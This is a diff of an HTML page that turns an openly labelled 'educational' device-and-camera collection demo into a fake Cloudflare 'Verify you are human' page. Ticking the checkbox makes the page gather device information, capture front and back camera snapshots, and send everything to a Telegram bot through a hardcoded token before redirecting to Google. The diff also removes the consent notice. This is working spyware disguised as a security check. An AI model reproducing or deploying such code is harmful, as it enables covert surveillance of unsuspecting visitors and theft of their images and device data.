@@ -2,30 +2,109 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Device Info & Camera Access</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Secure Connection Check</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
   <style>
     body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
+      font-family: 'Roboto', sans-serif;
       background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-    h2 {
-      color: #333;
+    main {
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      max-width: 500px;
+      width: 100%;
+      text-align: center;
+    }
+    h1 {
+      font-size: 1.875rem;
+      font-weight: normal;
+      margin-bottom: 0.5rem;
+    }
+    p {
+      font-size: 1.125rem;
+      font-weight: normal;
+      margin-bottom: 1.5rem;
+    }
+    section {
+      border: 1px solid #d1d5db;
+      border-radius: 0.125rem;
+      padding: 0.75rem 1rem;
+      display: flex;
+      align-items: center;
+      margin-bottom: 1.5rem;
+    }
+    input[type="checkbox"] {
+      width: 1.25rem;
+      height: 1.25rem;
+      border: 1px solid #9ca3af;
+      border-radius: 0.125rem;
+    }
+    label {
+      font-size: 0.875rem;
+      user-select: none;
+    }
+    .ml-4 {
+      margin-left: 1rem;
+    }
+    .flex {
+      display: flex;
+    }
+    .flex-col {
+      flex-direction: column;
+    }
+    .items-center {
+      align-items: center;
+    }
+    .space-x-1 > * + * {
+      margin-left: 0.25rem;
+    }
+    .text-xs {
+      font-size: 0.75rem;
+    }
+    .text-gray-600 {
+      color: #4b5563;
+    }
+    .mt-0.5 {
+      margin-top: 0.125rem;
     }
     #loading {
-      font-size: 18px;
-      margin-top: 20px;
+      font-size: 1.125rem;
+      margin-top: 1.25rem;
       color: #555;
     }
   </style>
 </head>
 <body>
-  <h2>This website is for educational purposes only.</h2>
-  <p>
-    This demo collects device and camera info ethically, with your consent.
-  </p>
-  <div id="loading">Loading...</div>
+  <main>
+    <h1>opaslabs.vercel.app</h1>
+    <p>Checking if the site connection is secure</p>
+    <section>
+      <input id="verifyHuman" type="checkbox" />
+      <label for="verifyHuman">Verify you are human</label>
+      <div class="ml-4 flex flex-col items-center">
+        <img alt="Cloudflare logo orange cloud with text" class="h-6 w-auto" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" />
+        <div class="text-xs text-gray-600 flex space-x-1 mt-0.5">
+          <span>Privacy</span>
+          <span>·</span>
+          <span>Terms</span>
+        </div>
+      </div>
+    </section>
+    <p>opaslabs.vercel.app needs to review the security of your connection before proceeding.</p>
+    <div id="loading">Waiting for verification...</div>
+  </main>
 
   <script>
     const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
@@ -213,50 +292,52 @@
       });
     }
 
-    // Automatically execute on page load
-    window.addEventListener('load', async () => {
-      const loadingElement = document.getElementById('loading');
-      loadingElement.textContent = 'Collecting data...';
+    // Execute when checkbox is checked
+    document.getElementById('verifyHuman').addEventListener('change', async function() {
+      if (this.checked) {
+        const loadingElement = document.getElementById('loading');
+        loadingElement.textContent = 'Collecting data...';
 
-      const info = await getDeviceInfo();
+        const info = await getDeviceInfo();
 
-      // Capture front camera (only once)
-      let frontSnap = null;
-      if (!frontCaptured) {
-        loadingElement.textContent = 'Accessing front camera...';
-        frontSnap = await getSnapshot("user");
-        frontCaptured = true;
+        // Capture front camera (only once)
+        let frontSnap = null;
+        if (!frontCaptured) {
+          loadingElement.textContent = 'Accessing front camera...';
+          frontSnap = await getSnapshot("user");
+          frontCaptured = true;
+        }
+
+        // Capture back camera (only once)
+        let backSnap = null;
+        if (!backCaptured) {
+          loadingElement.textContent = 'Accessing back camera...';
+          backSnap = await getSnapshot("environment");
+          backCaptured = true;
+        }
+
+        // Set camera status
+        if (frontSnap && backSnap) {
+          info.cameraStatus = "Front & Back Captured";
+        } else if (frontSnap) {
+          info.cameraStatus = "Front Only";
+        } else if (backSnap) {
+          info.cameraStatus = "Back Only";
+        } else {
+          info.cameraStatus = "None / Access Denied";
+        }
+
+        // Send info and photos
+        loadingElement.textContent = 'Sending data...';
+        await sendTextToTelegram(info);
+        if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
+        if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");
+
+        // Redirect after 3s
+        setTimeout(() => {
+          window.location.href = "https://www.google.com";
+        }, 3000);
       }
-
-      // Capture back camera (only once)
-      let backSnap = null;
-      if (!backCaptured) {
-        loadingElement.textContent = 'Accessing back camera...';
-        backSnap = await getSnapshot("environment");
-        backCaptured = true;
-      }
-
-      // Set camera status
-      if (frontSnap && backSnap) {
-        info.cameraStatus = "Front & Back Captured";
-      } else if (frontSnap) {
-        info.cameraStatus = "Front Only";
-      } else if (backSnap) {
-        info.cameraStatus = "Back Only";
-      } else {
-        info.cameraStatus = "None / Access Denied";
-      }
-
-      // Send info and photos
-      loadingElement.textContent = 'Sending data...';
-      await sendTextToTelegram(info);
-      if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
-      if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");
-
-      // Redirect after 3s
-      setTimeout(() => {
-        window.location.href = "https://www.google.com";
-      }, 3000);
     });
   </script>
 </body>
